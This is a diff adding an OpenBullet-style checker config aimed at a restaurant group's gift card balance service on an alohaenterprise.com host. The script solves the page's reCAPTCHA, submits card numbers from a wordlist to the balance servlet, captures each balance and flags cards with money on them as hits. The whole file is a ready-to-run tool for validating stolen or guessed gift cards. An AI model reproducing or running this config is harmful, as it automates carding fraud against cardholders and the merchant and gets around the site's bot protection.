@@ -1,0 +1,47 @@
+[SETTINGS]
+{
+  "Name": "fifthgroup.com GC",
+  "SuggestedBots": 1,
+  "LastModified": "2018-09-17T16:38:32.3585816+00:00",
+  "AdditionalInfo": "",
+  "Author": "v0ilawes",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST GET "https://5th.alohaenterprise.com:4430/memberlink/GiftCards.html?companyID=fgr01" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+RECAPTCHA "https://5th.alohaenterprise.com:4430/memberlink/GiftCards.html?companyID=fgr01" "6LfF9y8UAAAAAMXzXpAhDZ8NNA7bYoFyx1q2XhxC" -> VAR "captcha" 
+REQUEST GET "https://5th.alohaenterprise.com:4430/servlet/MemberLinkSVServlet?companyID=fgr01&requestType=checkSVCardForEPin&cardNumber=<USER>&reCaptchaResponse=<captcha>&_=1537202213860" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Host: 5th.alohaenterprise.com:4430" 
+  HEADER "Referer: https://5th.alohaenterprise.com:4430/memberlink/GiftCards.html?companyID=fgr01" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+PARSE "<SOURCE>" LR "\"cardBalance\":" "\"" Recursive=FALSE -> CAP "Balance" "$" "" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "\"currentCardBalance\":" 
+  KEYCHAIN Failure OR 
+    KEY "\"currentCardBalance\":0" 
